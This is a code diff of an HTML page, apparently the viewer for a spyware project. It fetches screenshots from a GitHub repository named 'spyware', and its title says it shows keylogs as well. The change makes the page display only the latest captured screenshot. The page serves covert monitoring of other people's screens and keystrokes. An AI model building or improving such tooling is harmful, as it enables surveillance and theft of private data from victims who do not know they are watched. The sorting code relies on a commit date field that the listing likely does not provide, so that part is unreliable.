@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Monitoring - Screenshots and Keylogs</title>
+    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,25 +16,26 @@
     </style>
 </head>
 <body>
-    <h1>Remote Monitoring - Screenshots and Keylogs</h1>
+    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
     
-    <h2>Screenshots</h2>
-    <div id="screenshots">
-        <!-- Auto-updating list of images -->
+    <h2>Latest Screenshot</h2>
+    <div id="latestScreenshot">
+        <!-- Latest screenshot will be displayed here -->
         <script>
             const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
             fetch(repo)
                 .then(response => response.json())
                 .then(data => {
-                    data.forEach(file => {
-                        if (file.name.endsWith(".png")) {
-                            let img = document.createElement("img");
-                            img.src = file.download_url; // Use the download URL directly
-                            document.getElementById("screenshots").appendChild(img);
-                        }
-                    });
+                    // Filter and sort the images to get the latest one
+                    const imageFiles = data.filter(file => file.name.endsWith(".png"));
+                    if (imageFiles.length > 0) {
+                        const latestFile = imageFiles.sort((a, b) => new Date(b.commit.author.date) - new Date(a.commit.author.date))[0];
+                        let img = document.createElement("img");
+                        img.src = latestFile.download_url; // Use the download URL for the latest screenshot
+                        document.getElementById("latestScreenshot").appendChild(img);
+                    }
                 })
-                .catch(error => console.error('Error fetching screenshots:', error));
+                .catch(error => console.error('Error fetching latest screenshot:', error));
         </script>
     </div>
 
